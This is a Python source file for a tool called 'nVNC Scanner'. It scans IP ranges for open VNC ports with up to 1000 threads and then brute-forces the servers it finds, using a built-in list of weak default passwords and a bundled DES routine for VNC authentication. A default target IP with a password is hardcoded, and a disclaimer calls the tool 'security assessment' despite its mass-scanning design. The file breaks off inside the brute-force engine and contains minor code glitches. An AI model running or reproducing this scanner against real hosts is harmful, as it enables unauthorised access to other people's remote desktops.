import sys
import os
import cmd
import socket
import threading
import pickle
import time

from sys import stdout
from struct import pack, unpack

VERSION = "0x203"
CODENAME = "CheesePizza"
DEFAULT_CONFIG = dict()
CONFIG = dict()
FILES = dict()
FOLDERS = dict()
DISCLAIMER = """

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This is not a hacking tool, this is a security assessment tool.
We do not encourage cracking or any other illicit activities that
put in danger the privacy or the informational integrity of others,
and we certainly do not want this tool to be misused.
!!! USE IT AT YOUR OWN RISK !!!
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


"""

DEFAULT_PASSWORDS = """1
12
123
1234
12345
123456
1234567
12345678
letmein
admin
administ
password
1212
"""

#============DEFAULT_CONFIG============#
DEFAULT_CONFIG['scan_range'] = "192.168.*.*"
DEFAULT_CONFIG['scan_port'] = "5900"
DEFAULT_CONFIG['scan_timeout'] = "5"
DEFAULT_CONFIG['scan_threads'] = "1000"
DEFAULT_CONFIG['brute_threads'] = "500"
DEFAULT_CONFIG['brute_timeout'] = "5"
DEFAULT_CONFIG['auto_save'] = "true"
DEFAULT_CONFIG['auto_brute'] = "true"
#============DEFAULT_CONFIG============#

#============FILES============#
FILES['results'] = {"folder": "output", "name":"results.txt"}
FILES['ips'] = {"folder": "output", "name":"ips.txt"}
FILES['passwords'] = {"folder": "input", "name":"passwords.txt"}
FILES['config'] = {"folder": "nbin", "name":"config.conf"}
FILES['ips.tmp'] = {"folder": "nbin", "name":"ips.tmp"}
#============FILES============#

#============FOLDERS============#
FOLDERS['output'] = "output"
FOLDERS['input'] = "input"
FOLDERS['nbin'] = "bin"
#============FOLDERS============#

class _baseDes(object):
	def __init__(self, mode=0, IV=None, pad=None, padmode=1):
		if IV:
			IV = self._guardAgainstUnicode(IV)
		if pad:
			pad = self._guardAgainstUnicode(pad)
		self.block_size = 8
		if pad and padmode == 2:
			raise ValueError("Cannot use a pad character with 2")
		if IV and len(IV) != self.block_size:
			raise ValueError("Invalid Initial Value (IV), must be a multiple of " + str(self.block_size) + " bytes")

		self._mode = mode
		self._iv = IV
		self._padding = pad
		self._padmode = padmode

	def getKey(self):
		"""getKey() -> bytes"""
		return self.__key

	def setKey(self, key):
		"""Will set the crypting key for this object."""
		key = self._guardAgainstUnicode(key)
		self.__key = key

	def getMode(self):
		"""getMode() -> pyDes.ECB or pyDes.1"""
		return self._mode

	def setMode(self, mode):
		"""Sets the type of crypting mode, pyDes.ECB or pyDes.1"""
		self._mode = mode

	def getPadding(self):
		"""getPadding() -> bytes of length 1. Padding character."""
		return self._padding

	def setPadding(self, pad):
		"""setPadding() -> bytes of length 1. Padding character."""
		if pad is not None:
			pad = self._guardAgainstUnicode(pad)
		self._padding = pad

	def getPadMode(self):
		"""getPadMode() -> pyDes.1 or pyDes.2"""
		return self._padmode

	def setPadMode(self, mode):
		"""Sets the type of padding mode, pyDes.1 or pyDes.2"""
		self._padmode = mode

	def getIV(self):
		"""getIV() -> bytes"""
		return self._iv

	def setIV(self, IV):
		"""Will set the Initial Value, used in conjunction with 1 mode"""
		if not IV or len(IV) != self.block_size:
			raise ValueError("Invalid Initial Value (IV), must be a multiple of " + str(self.block_size) + " bytes")
		IV = self._guardAgainstUnicode(IV)
		self._iv = IV

	def _padData(self, data, pad, padmode):
		if padmode is None:
			padmode = self.getPadMode()
		if pad and padmode == 2:
			raise ValueError("Cannot use a pad character with 2")

		if padmode == 1:
			if len(data) % self.block_size == 0:
				return data

			if not pad:
				pad = self.getPadding()
			if not pad:
				raise ValueError("Data must be a multiple of " + str(self.block_size) + " bytes in length. Use padmode=2 or set the pad character.")
			data += (self.block_size - (len(data) % self.block_size)) * pad

		elif padmode == 2:
			pad_len = 8 - (len(data) % self.block_size)
			if sys.version_info[0] < 3:
				data += pad_len * chr(pad_len)
			else:
				data += bytes([pad_len] * pad_len)

		return data

	def _unpadData(self, data, pad, padmode):
		# Unpad data depending on the mode.
		if not data:
			return data
		if pad and padmode == 2:
			raise ValueError("Cannot use a pad character with 2")
		if padmode is None:
			# Get the default padding mode.
			padmode = self.getPadMode()

		if padmode == 1:
			if not pad:
				pad = self.getPadding()
			if pad:
				data = data[:-self.block_size] + \
				       data[-self.block_size:].rstrip(pad)

		elif padmode == 2:
			if sys.version_info[0] < 3:
				pad_len = ord(data[-1])
			else:
				pad_len = data[-1]
			data = data[:-pad_len]

		return data

	def _guardAgainstUnicode(self, data):
		if sys.version_info[0] < 3:
			if isinstance(data, unicode):
				raise ValueError("pyDes can only work with bytes, not Unicode strings.")
		else:
			if isinstance(data, str):
				try:
					return data.encode('ascii')
				except UnicodeEncodeError:
					pass
				raise ValueError("pyDes can only work with encoded strings, not Unicode.")
		return data

class des(_baseDes):
	__pc1 = [56, 48, 40, 32, 24, 16,  8,
		  0, 57, 49, 41, 33, 25, 17,
		  9,  1, 58, 50, 42, 34, 26,
		 18, 10,  2, 59, 51, 43, 35,
		 62, 54, 46, 38, 30, 22, 14,
		  6, 61, 53, 45, 37, 29, 21,
		 13,  5, 60, 52, 44, 36, 28,
		 20, 12,  4, 27, 19, 11,  3
	]

	__left_rotations = [
		1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1
	]

	__pc2 = [
		13, 16, 10, 23,  0,  4,
		 2, 27, 14,  5, 20,  9,
		22, 18, 11,  3, 25,  7,
		15,  6, 26, 19, 12,  1,
		40, 51, 30, 36, 46, 54,
		29, 39, 50, 44, 32, 47,
		43, 48, 38, 55, 33, 52,
		45, 41, 49, 35, 28, 31
	]

	__ip = [57, 49, 41, 33, 25, 17, 9,  1,
		59, 51, 43, 35, 27, 19, 11, 3,
		61, 53, 45, 37, 29, 21, 13, 5,
		63, 55, 47, 39, 31, 23, 15, 7,
		56, 48, 40, 32, 24, 16, 8,  0,
		58, 50, 42, 34, 26, 18, 10, 2,
		60, 52, 44, 36, 28, 20, 12, 4,
		62, 54, 46, 38, 30, 22, 14, 6
	]

	__expansion_table = [
		31,  0,  1,  2,  3,  4,
		 3,  4,  5,  6,  7,  8,
		 7,  8,  9, 10, 11, 12,
		11, 12, 13, 14, 15, 16,
		15, 16, 17, 18, 19, 20,
		19, 20, 21, 22, 23, 24,
		23, 24, 25, 26, 27, 28,
		27, 28, 29, 30, 31,  0
	]

	__sbox = [
		[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
		 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
		 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
		 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],

		[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
		 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
		 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
		 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],

		# S3
		[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
		 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
		 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
		 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],

		# S4
		[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
		 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
		 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
		 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],

		# S5
		[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
		 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
		 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
		 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],

		# S6
		[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
		 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
		 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
		 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],

		# S7
		[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
		 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
		 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
		 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],

		# S8
		[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
		 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
		 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
		 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
	]

	__p = [
		15, 6, 19, 20, 28, 11,
		27, 16, 0, 14, 22, 25,
		4, 17, 30, 9, 1, 7,
		23,13, 31, 26, 2, 8,
		18, 12, 29, 5, 21, 10,
		3, 24
	]

	__fp = [
		39,  7, 47, 15, 55, 23, 63, 31,
		38,  6, 46, 14, 54, 22, 62, 30,
		37,  5, 45, 13, 53, 21, 61, 29,
		36,  4, 44, 12, 52, 20, 60, 28,
		35,  3, 43, 11, 51, 19, 59, 27,
		34,  2, 42, 10, 50, 18, 58, 26,
		33,  1, 41,  9, 49, 17, 57, 25,
		32,  0, 40,  8, 48, 16, 56, 24
	]

	ENCRYPT =	0x00
	DECRYPT =	0x01

	def __init__(self, key, mode=0, IV=None, pad=None, padmode=1):
		if len(key) != 8:
			raise ValueError("Invalid DES key size. Key must be exactly 8 bytes long.")
		_baseDes.__init__(self, mode, IV, pad, padmode)
		self.key_size = 8

		self.L = []
		self.R = []
		self.Kn = [ [0] * 48 ] * 16	# 16 48-bit keys (K1 - K16)
		self.final = []

		self.setKey(key)

	def setKey(self, key):
		"""Will set the crypting key for this object. Must be 8 bytes."""
		_baseDes.setKey(self, key)
		self.__create_sub_keys()

	def __String_to_BitList(self, data):
		"""Turn the string data, into a list of bits (1, 0)'s"""
		if sys.version_info[0] < 3:
			data = [ord(c) for c in data]
		l = len(data) * 8
		result = [0] * l
		pos = 0
		for ch in data:
			i = 7
			while i >= 0:
				if ch & (1 << i) != 0:
					result[pos] = 1
				else:
					result[pos] = 0
				pos += 1
				i -= 1

		return result

	def __BitList_to_String(self, data):
		"""Turn the list of bits -> data, into a string"""
		result = []
		pos = 0
		c = 0
		while pos < len(data):
			c += data[pos] << (7 - (pos % 8))
			if (pos % 8) == 7:
				result.append(c)
				c = 0
			pos += 1

		if sys.version_info[0] < 3:
			return ''.join([ chr(c) for c in result ])
		else:
			return bytes(result)

	def __permutate(self, table, block):
		"""Permutate this block with the specified table"""
		return list(map(lambda x: block[x], table))

	def __create_sub_keys(self):
		"""Create the 16 subkeys K[1] to K[16] from the given key"""
		key = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))
		i = 0
		self.L = key[:28]
		self.R = key[28:]
		while i < 16:
			j = 0
			while j < des.__left_rotations[i]:
				self.L.append(self.L[0])
				del self.L[0]

				self.R.append(self.R[0])
				del self.R[0]

				j += 1

			self.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)

			i += 1

	def __des_crypt(self, block, crypt_type):
		"""Crypt the block of data through DES bit-manipulation"""
		block = self.__permutate(des.__ip, block)
		self.L = block[:32]
		self.R = block[32:]

		# Encryption starts from Kn[1] through to Kn[16]
		if crypt_type == des.ENCRYPT:
			iteration = 0
			iteration_adjustment = 1
		# Decryption starts from Kn[16] down to Kn[1]
		else:
			iteration = 15
			iteration_adjustment = -1

		i = 0
		while i < 16:
			# Make a copy of R[i-1], this will later become L[i]
			tempR = self.R[:]

			# Permutate R[i - 1] to start creating R[i]
			self.R = self.__permutate(des.__expansion_table, self.R)

			# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here
			self.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))
			B = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]
			j = 0
			Bn = [0] * 32
			pos = 0
			while j < 8:
				m = (B[j][0] << 1) + B[j][5]
				n = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]

				v = des.__sbox[j][(m << 4) + n]

				Bn[pos] = (v & 8) >> 3
				Bn[pos + 1] = (v & 4) >> 2
				Bn[pos + 2] = (v & 2) >> 1
				Bn[pos + 3] = v & 1

				pos += 4
				j += 1

			self.R = self.__permutate(des.__p, Bn)
			self.R = list(map(lambda x, y: x ^ y, self.R, self.L))
			self.L = tempR

			i += 1
			iteration += iteration_adjustment

		self.final = self.__permutate(des.__fp, self.R + self.L)
		return self.final

	def crypt(self, data, crypt_type):
		"""Crypt the data in blocks, running it through des_crypt()"""

		if not data:
			return ''
		if len(data) % self.block_size != 0:
			if crypt_type == des.DECRYPT:
				raise ValueError("Invalid data length, data must be a multiple of " + str(self.block_size) + " bytes\n.")
			if not self.getPadding():
				raise ValueError("Invalid data length, data must be a multiple of " + str(self.block_size) + " bytes\n. Try setting the optional padding character")
			else:
				data += (self.block_size - (len(data) % self.block_size)) * self.getPadding()

		if self.getMode() == 1:
			if self.getIV():
				iv = self.__String_to_BitList(self.getIV())
			else:
				raise ValueError("For 1 mode, you must supply the Initial Value (IV) for ciphering")
		i = 0
		dict = {}
		result = []
		while i < len(data):

			block = self.__String_to_BitList(data[i:i+8])

			if self.getMode() == 1:
				if crypt_type == des.ENCRYPT:
					block = list(map(lambda x, y: x ^ y, block, iv))
				processed_block = self.__des_crypt(block, crypt_type)

				if crypt_type == des.DECRYPT:
					processed_block = list(map(lambda x, y: x ^ y, processed_block, iv))
					iv = block
				else:
					iv = processed_block
			else:
				processed_block = self.__des_crypt(block, crypt_type)

			result.append(self.__BitList_to_String(processed_block))
			i += 8

		if sys.version_info[0] < 3:
			return ''.join(result)
		else:
			return bytes.fromhex('').join(result)

	def encrypt(self, data, pad=None, padmode=None):
		data = self._guardAgainstUnicode(data)
		if pad is not None:
			pad = self._guardAgainstUnicode(pad)
		data = self._padData(data, pad, padmode)
		return self.crypt(data, des.ENCRYPT)

	def decrypt(self, data, pad=None, padmode=None):
		data = self._guardAgainstUnicode(data)
		if pad is not None:
			pad = self._guardAgainstUnicode(pad)
		data = self.crypt(data, des.DECRYPT)
		return self._unpadData(data, pad, padmode)

class RFBProtocol:
	def __init__(self, host="69.193.118.223", password="1212", port=5901, timeout=5, shared=1):
		self.host = str(host)
		self.port = int(port)
		self.password = str(password)
		self.timeout = float(timeout)
		self.shared = int(shared)
		self.sock = None
		self.connected = False
		self.RFB = False
		self.null = False
		self.version = None
		self.name = None
		self.fail_message = None

	def connect(self):
		try:
			self.conn_init()
			self.client_auth()
		except Exception as ex:
			pass

	def close(self):
		self.sock.close()

	def conn_init(self):
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.settimeout(self.timeout)
		self.sock.connect((self.host, self.port))
		result = self.sock.recv(12)
		if result[:3] == "RFB":
			self.RFB = True
			self.sock.send("RFB 003.003\n")
		else:
			raise Exception("Not RFB")

	def client_auth(self):
		result = self.sock.recv(4)
		(method,) = unpack("!I", result)
		if method == 0:
			(lenght,) = unpack("!I", self.sock.recv(4))
			self.fail_message = self.sock.recv(int(lenght))
			raise Exception(self.fail_message)
		elif method == 1:
			self.null = True
			self.client_init()
		elif method == 2:
			self.vnc_auth()
		else:
			raise Exception("Unsupported auth method")


	def vnc_auth(self):
		challenge = self.sock.recv(16)
		self.send_password(challenge)
		(result,) = unpack("!I", self.sock.recv(4))
		self.status_code = result
		if result == 0:
			self.client_init()
		elif result == 1:
			raise Exception("WRONG PASSWORD")

	def client_init(self):
		self.connected = True
		self.sock.send(pack("!B", self.shared))
		result = self.sock.recv(24)
		(width, height, pixformat, namelen) = unpack("!HH16sI", result)
		self.name = self.sock.recv(namelen)		

	def send_password(self, challenge):
		password = (self.password + '\0' * 8)[:8]
		response = self.des_enc(password, challenge)
		self.sock.send(response)

	def des_enc(self, key, string):
		newkey = []
		for ki in range(len(key)):
			bsrc = ord(key[ki])
			btgt = 0
			for i in range(8):
				if bsrc & (1 << i):
					btgt = btgt | (1 << 7-i)
			newkey.append(chr(btgt))
		DES = des("".join(newkey))
		return DES.encrypt(string)

class MiscFunctions:

	def is_int(self, string):
		try:
			int(string)
			return True
		except ValueError:
			return False

	def is_float(self, string):
		try:
			float(string)
			return True
		except ValueError:
			return False

	def is_bool(self, string):
		if string.lower() in ("true", "false"):
			return True
		else:
			return False

	def save_config(self):
		Files.file_write(FILES['config'], pickle.dumps(CONFIG))

class FilesHandler:

	def __init__(self):
		self.sep = os.sep
		self.root_path = os.getcwd() + self.sep

	def file_get_contents(self, location):
		if self.file_exists(location):
			return open(location).read()
		else:
			return False

	def file_write(self, location, data="", mode="w"):
		if mode=="i":
			oldf = open(location).read()
			f = open(location, 'w')
			f.write(data.rstrip() + '\n' + oldf.rstrip())
			f.close()
		else:
			f = open(location, mode)
			f.write(data)
			f.close()

	def file_empty(self, location):
		try:
			if os.path.getsize(location) > 0:
				return False
			else:
				return True
		except OSError:
			return True

	def file_exists(self, file_path):
		return os.path.isfile(file_path)

	def dir_exists(self, dir_path):
		if os.path.exists(dir_path) and (not os.path.isfile(dir_path)):
			return True
		else:
			return False

	def dirname(self, path):
		return os.path.dirname(path)

	def mkdir(self, path):
		try:
			os.makedirs(path)
		except OSError:
			passlist

class Deploy:
	def __init__(self):
		self.deploy_folders()
		self.deploy_files()

	def deploy_folders(self):
		for (key, folder) in FOLDERS.items():
			folder = Files.root_path + folder + Files.sep
			FOLDERS[key] = folder
			if not Files.dir_exists(folder):
				Files.mkdir(folder)

	def deploy_files(self):
		for (key, file) in FILES.items():
			file = FOLDERS[file['folder']] + file['name']
			FILES[key] = file
			if not Files.file_exists(file):
				Files.file_write(file)

		if Files.file_empty(FILES['config']):
			Files.file_write(FILES['config'], pickle.dumps(DEFAULT_CONFIG))

		if Files.file_empty(FILES['passwords']):
			Files.file_write(FILES['passwords'], DEFAULT_PASSWORDS)


class Display:
	def __init__(self):
		pass

	def delimiter(self, string):
		stdout.write("\n" + ("-" * len(string)) + "\n")



	def getTerminalSize(self):
		current_os = os.name
		tuple_xy=None
		if current_os in ('nt','dos','ce'):
			tuple_xy = self._getTerminalSize_windows()
			if tuple_xy is None:
				tuple_xy = self._getTerminalSize_tput()
		if current_os == 'posix':
			tuple_xy = self._getTerminalSize_linux()
		if tuple_xy is None:
			tuple_xy = (80, 25)
		return tuple_xy

	def _getTerminalSize_windows(self):
		res=None
		try:
			from ctypes import windll, create_string_buffer
			h = windll.kernel32.GetStdHandle(-12)
			csbi = create_string_buffer(22)
			res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
		except:
			return None
		if res:
			import struct
			(bufx, bufy, curx, cury, wattr,
			 left, top, right, bottom, maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
			sizex = right - left + 1
			sizey = bottom - top + 1
			return sizex, sizey
		else:
			return None
	def _getTerminalSize_tput(self):
		try:
			import subprocess
			proc=subprocess.Popen(["tput", "cols"],stdin=subprocess.PIPE,stdout=subprocess.PIPE)
			output=proc.communicate(input=None)
			cols=int(output[0])
			proc=subprocess.Popen(["tput", "lines"],stdin=subprocess.PIPE,stdout=subprocess.PIPE)
			output=proc.communicate(input=None)
			rows=int(output[0])
			return (cols,rows)
		except:
			return None
	def _getTerminalSize_linux(self):
		def ioctl_GWINSZ(fd):
			try:
				import fcntl, termios, struct, os
				cr = struct.unpack('hh', fcntl.ioctl(fd, termios.TIOCGWINSZ,'1234'))
			except:
				return None
			return cr
		cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)
		if not cr:
			try:
				fd = os.open(os.ctermid(), os.O_RDONLY)
				cr = ioctl_GWINSZ(fd)
				os.close(fd)
			except:
				pass
		if not cr:
			try:
				cr = (env['LINES'], env['COLUMNS'])
			except:
				return None
		return int(cr[1]), int(cr[0])
	def posvals(self,val='x'):
		self.size = self.getTerminalSize()
		self.tx = self.size[0]
		self.ty = self.size[1]
		if val=='x':
			return self.tx
		else:
			return self.ty


	def clearscreen(self):
		if os.name in ("nt", "dos", "ce"):
			os.system("CLS")
		elif os.name == "posix":
			os.system("clear")
		else:
			stdout.write("\n"*150)
		self.banner()

	def banner(self):
		banner = list()
		banner.append("|>>>> - nVNC Scanner - %s - %s - <<<<|" % (VERSION, CODENAME))
		banner.append("Scan Threads: %s <-> Scan Timeout: %s <-> Scan Port: %s" % (CONFIG['scan_threads'], CONFIG['scan_timeout'], CONFIG['scan_port']))
		banner.append("Brute Threads: %s <-> Brute Timeout: %s <-> Auto Brute: %s" % (CONFIG['brute_threads'], CONFIG['brute_timeout'], CONFIG['auto_brute']))
		banner.append("Scan Range: %s <-> Auto Save: %s" % (CONFIG['scan_range'], CONFIG['auto_save']))
		stdout.write("\n")
		for line in banner:
			stdout.write(line.center(self.posvals()))
			if 'nVNC' in line:
				stdout.write('\n')
		stdout.write("\n\n")


	def disclaimer(self):
		for line in DISCLAIMER.split('\n'):
			stdout.write(line.center(self.posvals()))


class NetTools:

	def convert_ip(self, string):
		if self.is_ip(string.strip()):
			return [self.ip2int(string.strip())]
		else:
			return False

	def convert_range(self, string):
		if string.count('-') == 1:
			string = string.strip().split('-')
			if self.is_ip(string[0]) and self.is_ip(string[1]):
				string = [self.ip2int(x) for x in string]
				string.sort()
				return string

		elif string.count('*') in (1,2,3):
			if self.is_ip(string.replace('*', '0')):
				return [self.ip2int(string.replace('*', '0')), self.ip2int(string.replace('*', '255'))]
		else:

			return False

	def is_range(self, string):
		if string.count('-') == 1:
			string = string.strip().split('-')
			if self.is_ip(string[0]) and self.is_ip(string[1]):
				return True

		elif string.count('*') in (1,2,3):
			if self.is_ip(string.replace('*', '0')):
				return True
		else:
			return False

	def is_ip(self, address='0.0.0.0'):
		try:
			octets = address.split('.')
			if len(octets) == 4:
				ipAddr = "".join(octets)
				if ipAddr.isdigit():
					if (int(octets[0]) >= 0) and (int(octets[0]) <= 255):
						if (int(octets[1]) >= 0) and (int(octets[1]) <= 255):
							if (int(octets[2]) >= 0) and (int(octets[2]) <= 255):
								if (int(octets[3]) >= 0) and (int(octets[3]) <= 255):
									return True
		except IndexError:
			pass
		except ValueError:
			pass
		return False

	def ip2int(self, ip):
		ip = ip.split(".")
		return int("%02x%02x%02x%02x" % (int(ip[0]),int(ip[1]),int(ip[2]),int(ip[3])),16)

	def int2ip(self, integer):
		integer = "%08x" % (integer)
	   	return "%i.%i.%i.%i" % (int(integer[0:2],16),int(integer[2:4],16),int(integer[4:6],16),int(integer[6:8],16))

class Interface:

	def Start(self):
		self.main_console().cmdloop()

	class main_console(cmd.Cmd):
		prompt = ("+>").rstrip()
		ruler = "~"

		def default(self, line):
			stdout.write("\n\tNope.\n\n")

		#==========MISC COMMANDS==========#
		def do_disclaimer(self, line):
			Display.disclaimer()
		def do_add(self, line):
			line = line.lower().split(" ")
			if len(line) == 2 and line[0] and line[1]:
				if line[1] in FILES.keys():
					Files.file_write(FILES[line[1]], line[0], 'i')
					stdout.write("\n\t[OK]\n")
				else:
					stdout.write("\n\t[ERROR]\n")
			else:
				stdout.write("\n\t[ERROR]\n")
			time.sleep(0.5)
			Display.clearscreen()

		def do_flush(self, line):
			line = line.lower().split(" ")
			if len(line) == 1 and line[0]:
				if line[0] in FILES.keys():
					Files.file_write(FILES[line[0]])
					stdout.write("\n\t[OK]\n")
				elif line[0].strip() in ("all", "everything"):
					for file in FILES.keys():
						if file != "config":
							Files.file_write(FILES[file])
					stdout.write("\n\t[OK]\n")
			else:
				stdout.write("\n\t[ERROR]\n")
			time.sleep(0.5)
			Display.clearscreen()

		def do_clear(self, line):
			Display.clearscreen()
		def do_cls(self,line):
			self.do_clear(line)

		def do_exit(self, line):
			sys.exit("Bye.")
		def do_quit(self, line):
			self.do_exit(line)
		def do_q(self, line):
			self.do_exit(line)
		#==========MISC COMMANDS==========#


		#==========SCAN COMMAND===========#
		def do_scan(self, line):
			line = line.lower().split(" ")
			if len(line) == 1 and line[0] != "":
				if NetTools.is_range(line[0]):
					stdout.write("\n\t[OK]\n")
					CONFIG['scan_range'] = line[0]
				else:
					stdout.write("\n\t[ERROR]\n")
			stdout.write("\n")
			ScanEngine.Start()
		#==========SCAN COMMAND===========#


		#==========BRUTE COMMAND===========#
		def do_brute(self, line):
			stdout.write("\n")
			BruteEngine.Start()
		#==========BRUTE COMMAND===========#


		#==========SET COMMAND===========#
		def do_set(self, line):
			OK = False
			line = line.lower().split(" ")
			if len(line) == 2 and line[0] in CONFIG.keys():
				if line[0] == "scan_range" and NetTools.is_range(line[1]):
					OK = True
				elif line[0] in ("scan_threads", "brute_threads", "scan_port") and Misc.is_int(line[1]):
					OK = True
				elif line[0] in ("scan_timeout", "brute_timeout") and Misc.is_float(line[1]):
					OK = True
				elif line[0] in ("auto_brute", "auto_save") and Misc.is_bool(line[1]):
					OK = True

				if OK:
					CONFIG[line[0]] = line[1]
					stdout.write("\n\t[OK]\n")
				else:
					stdout.write("\n\t[ERROR]\n\n")		
			else:
				stdout.write("\n\t[ERROR]\n\n")
			if CONFIG['auto_save'] == "true":
				Misc.save_config()

			time.sleep(0.5)
			Display.clearscreen()
		#==========SET COMMAND===========#


		#==========SHOW COMMAND===========#
		def do_show(self, line):
			line = line.lower()
			if line in ("results", "result", "brute"):
				stdout.write("\nBrute Results")
				Display.delimiter("Brute Results")
				for line in open(FILES['results'], 'r').readlines():
					if line.strip() != "":
						stdout.write("%s\n" % line.strip())
				Display.delimiter("Brute Results")
			elif line in ("ips", "scan", "ip"):
				stdout.write("\nScan Results")
				Display.delimiter("Scan Results")
				for line in open(FILES['ips'], 'r').readlines():
					if line.strip() != "":
						stdout.write("%s\n" % line.strip())
				Display.delimiter("Scan Results")
			elif line in ("password", "passwords", "pass"):
				stdout.write("\nPasswords")
				Display.delimiter("Passwords")
				for line in open(FILES['passwords'], 'r').readlines():
					if line.strip() != "":
						stdout.write("%s\n" % line.strip())
				Display.delimiter("Passwords")
			else:
				stdout.write("\nSettings")
				Display.delimiter("Settings")
				for (config, value) in CONFIG.items():
					stdout.write("%s = %s\n" % (config, value))
				Display.delimiter("Settings")
				stdout.write("\n")
		#==========SHOW COMMAND===========#

class ScanEngine:
	def __init__(self):
		pass

	def init(self):
		global lock, semaphore
		lock = threading.Lock()
		semaphore = threading.Semaphore(int(CONFIG['scan_threads']))
		self.ips_file = open(FILES['ips'], 'a', 0)
		self.current = 0
		self.found = 0
		self.range = NetTools.convert_range(CONFIG['scan_range'])
		self.total = int(self.range[1]) - int(self.range[0])

	def Start(self):
		self.init()

		output_thread = threading.Thread(target=self.output_thread, args=())
		output_thread.daemon = True
		output_thread.start()

		try:
			integer = self.range[0]
			while integer <= self.range[1]:
				semaphore.acquire()
				thread = threading.Thread(target=self.scan_thread, args=(integer,))
				thread.daemon=True
				thread.start()
				integer += 1
				self.current += 1
		except:
			stdout.flush()
			stdout.write("\n\tSome thread related error occured, try lowering the threads amount.\n")

		while threading.active_count() > 1:
			pass

		self.ips_file.close()

		if CONFIG['auto_brute'] == "true":
			BruteEngine.Start()
		else:
			stdout.write("\n\nDONE! Check \"output/ips.txt\" or type \"show ips\"!\n\n")


	def scan_thread(self, integer):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(float(CONFIG['scan_timeout']))
			sock.connect((NetTools.int2ip(integer), int(CONFIG['scan_port'])))
			lock.acquire()
			self.found += 1
			self.ips_file.write("%s:%i\n" % (NetTools.int2ip(integer), int(CONFIG['scan_port'])))
			lock.release()
		except:
			pass
		semaphore.release()


	def output_thread(self):
		try:
			while self.total >= self.current:
				time.sleep(0.5)
				stdout.flush()
				stdout.write("\r Current [%i/%i] Found: %i   " % (self.current, self.total, self.found))
		except:
			pass

class BruteEngine:

	def __init__(self):
		pass

	def init(self):
		global lock, semaphore
		lock = threading.Lock()
		semaphore = threading.Semaphore(int(CONFIG['brute_threads']))
		self.results = open(FILES['results'], 'a', 0)
		self.passwords = list()
		self.servers = list()
		self.current_password = None
		self.output_kill = False
		self.get_passwords()
		self.get_servers()

	def Start(self):
		self.init()
		if self.passwords is not False:
			if self.servers is not False:
				output_thread = threading.Thread(target=self.output_thread, args=())
				output_thread.daemon = True
				output_thread.start()
				for self.current_password in self.passwords:
					try:
						for server in self.servers:
							semaphore.acquire()
							thread = threading.Thread(target=self.brute_thread, args=( server, self.current_password ))
							thread.daemon=True
							thread.start()
					except:
						stdout.flush()
						stdout.write("\n\tSome thread related error occured, try lowering the threads amount.\n")

					while threading.active_count() > 2:
						pass
				self.output_kill = True

				self.results.close()
